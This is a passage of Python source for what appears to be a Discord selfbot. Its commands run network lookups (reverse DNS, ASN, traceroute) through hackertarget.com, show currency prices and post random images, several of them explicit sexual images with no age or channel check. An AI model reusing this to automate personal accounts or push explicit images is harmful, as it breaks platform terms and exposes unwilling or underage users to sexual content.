            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            
            return
        
    @React.command(usage="rdns <IP Address>", description="Scans for reverse DNS records")
    async def rdns(ctx, ip: str):
        if ip is not None:
            request = requests.get(f'https://api.hackertarget.com/reversedns/?q={urllib.parse.quote(ip)}')
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Reverse DNS Lookup', description=f'{request.text}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        else:
            pass

    @React.command(usage="subnetcalc <Subnet>", description="Calculate a subnet mask")
    async def subnetcalc(ctx, subnet: str):
        request = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={urllib.parse.quote(subnet)}')
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Subnet Calc', description=f'{request.text}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="aslookup <ASN>", description="ASN Lookup")
    async def aslookup(ctx, asn: str):
        request = requests.get(f'https://api.hackertarget.com/aslookup/?q={urllib.parse.quote(asn)}')
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'AS Lookup', description=f'{request.text}',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="traceroute <IP>", description="Traceroute an IP ")
    async def traceroute(ctx, ip: str):
        if ip is not None:
            request = requests.get(f'https://api.hackertarget.com/mtr/?q={urllib.parse.quote(ip)}')
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Traceroute', description=f'{request.text}',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            pass
    
    @React.command(usage="currency <Symbol>",description="Latest price of various currencies")
    async def currency(ctx, symbol: str):
        embed = ""
        request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym={symbol}&tsyms=USD,EUR,GBP,CHF,CAD,AUD,RUB,JPY,CNY,INR,TRY,PLN')
        if request.json()['USD']:
            data = request.json()
            usd = data['USD']
            eur = data['EUR']
            gbp = data['GBP']
            chf = data['CHF']
            cad = data['CAD']
            aud = data['AUD']
            rub = data['RUB']
            jpy = data['JPY']
            cny = data['CNY']
            inr = data['INR']
            pln = data['PLN']
            __try = data['TRY']
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Currency | {symbol.upper()}""",timestamp=embed_timestamp())
            embed.description = f"""Current Price in: 
    **USD:** `{usd}$`
    **EUR:** `{eur}‚Ç¨`
    **GBP:** `{gbp}¬£`
    **CHF:** `{chf}CHF`
    **CAD:** `{cad}$`
    **AUD:** `{aud}$`
    **RUB:** `{rub}‚ÇΩ`
    **JPY:** `{jpy}¬•`
    **CNY:** `{cny}¬•`
    **INR:** `{inr}‚Çπ`
    **TRY:** `{__try}‚Ç∫`
    **PLN:** `{pln}z≈Ç`"""
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            await embed_or_codeblock(ctx, embed)



    # @React.command()
    # async def butt(ctx):
        
    #     request = requests.get(f'http://api.obutts.ru/noise')
    #     data = request.json()
    #     path = data[0]['preview']
    #     link = f'http://media.obutts.ru/{path}'
    #     print(data)
    #     embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Butt',timestamp=embed_timestamp())
    #     embed.set_image(url=link)
    #     embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
    #     embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
    #     await embed_or_codeblock(ctx, embed)



    @React.command(usage="boobs", description="Shows a boobs image")
    async def boobs(ctx):
        
        request = requests.get(f'http://api.oboobs.ru/noise')
        data = request.json()
        path = data[0]['preview']
        link = f'http://media.oboobs.ru/{path}'
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Boobs',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="yaoi", description="Shows a yaoi image")
    async def yaoi(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=yaoi')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Yaoi',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="ass", description="Shows an ass image")
    async def ass(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=ass')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Ass',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="hentaiass", description="Shows a hentai ass image")
    async def hentaiass(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=hass')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Hentai Ass',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="food", description="Sends a random food image")
    async def food(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=food')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Food',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="anal", description="Shows a anal image")
    async def anal(ctx):
        
        request = requests.get(f'https://nekobot.xyz/api/image?type=anal')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Anal',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


            
    @React.command(usage="blowjob", description="Shows a blowjob image")
    async def blowjob(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/blowjob')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Blowjob',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="feet", description="Shows a feet image")
    async def feet(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/feet')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Feet',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="waifu", description="Sends a random waifu image")
    async def waifu(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/waifu')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Waifu',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="wallpaper", description="Sends a random wallpaper image")
    async def wallpaper(ctx):
        
        request = requests.get(f'https://nekos.life/api/v2/img/wallpaper')
        data = request.json()
        link = data['url']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Wallpaper',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="yesorno", description="Sends a yes or no image")
    async def yesorno(ctx):
        
        request = requests.get(f'https://yesno.wtf/api')
        data = request.json()
        answer = data['answer']
        image = data['image']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'YesOrNo: {answer.capitalize()}',timestamp=embed_timestamp())
        embed.set_image(url=image)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="tpdne", description="Sends a random this person does not exist image")
    async def tpdne(ctx):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'This Person does not exist',timestamp=embed_timestamp())
        embed.set_image(url='https://thispersondoesnotexist.com/image?width=473&height=473')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


    
    @React.command(usage="sadcat", description="Sends a random sad cat image")
    async def sadcat(ctx):
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=sadcat')
        data = request.json()
        link = data['file']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sad Cat',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="supreme <Text>", description="Generates a Supreme Logo image")
    async def supreme(ctx, *, text: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Supreme',timestamp=embed_timestamp())
        request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=supreme&text={str(urllib.parse.quote(text))}').json()['url']
        embed.set_image(url=f'{request}')
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="color <HEX Code>", description="Shows information about the color")
    async def color(ctx, color: str):
        if color == "random":
            color = "%06x" % random.randint(0, 0xFFFFFF)

        if color[:1] == "#":
            color = color[1:]

        if not re.search(r'^(?:[0-9a-fA-F]{3}){1,2}$', color):
            return

        r = requests.get(f"https://reactselfbot.pro/api/generation.php?type=color&color={color}").json()

        embed = discord.Embed(color=r["int"], title=f'{r["name"]}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=r["image"])
        embed.set_image(url=r["image_gradient"])

        embed.add_field(name="HEX", value=r['hex'], inline=True)
        embed.add_field(name="RGB", value=r['rgb'], inline=True)
        embed.add_field(name="Integer", value=r['int'], inline=True)
        embed.add_field(name="Brightness", value=r['brightness'], inline=True)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])

        await ctx.send(embed=embed)
        
    @React.command(usage="approved <Member>", description="Generates a approved image with the member's profile picture")
    async def approved(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Approved',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=approved&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
